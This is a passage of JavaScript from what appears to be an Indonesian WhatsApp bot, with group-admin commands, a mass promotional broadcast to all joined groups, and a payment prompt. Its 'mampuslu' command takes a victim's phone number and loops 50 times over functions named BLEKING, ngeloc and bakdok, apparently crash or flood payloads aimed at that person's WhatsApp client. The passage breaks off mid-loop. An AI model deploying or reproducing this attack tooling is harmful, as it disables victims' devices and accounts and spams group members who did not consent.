let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await PannOfficiaL.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
PannOfficiaL.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
PannOfficiaL.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await PannOfficiaL.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await PannOfficiaL.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await PannOfficiaL.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://t.me/PannOfficiaLDeveloper\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaddFi3ISTkTUM8Vdb0b\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://www.youtube.com/@RafzMods999 \"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaddFi3ISTkTUM8Vdb0b\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Donate My Dev🙏\",\"url\":\"https://whatsapp.com/channel/0029VaddFi3ISTkTUM8Vdb0b\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaddFi3ISTkTUM8Vdb0b\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await PannOfficiaL.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
PannOfficiaL.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://e.top4top.io/p_3190lbz9s0.jpg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "toimage":
		case "toimg": {
			if (!/webp/.test(mime)) return reply(`Reply Sticker!!`)
			reply(mess.wait)
			let media = await PannOfficiaL.downloadAndSaveMediaMessage(qmsg)
			let ran = await getRandom(".png")
			exec(`ffmpeg -i ${media} ${ran}`, (err) => {
				fs.unlinkSync(media)
				if (err) return err
				let buffer = fs.readFileSync(ran)
				VxoZap.sendMessage(m.chat, {
					image: buffer
				}, {
					quoted: m
				})
				fs.unlinkSync(ran)
			})
		}
		break
		
case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await PannOfficiaL.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await PannOfficiaL.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'mampuslu': case 'pannoffcnibos': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
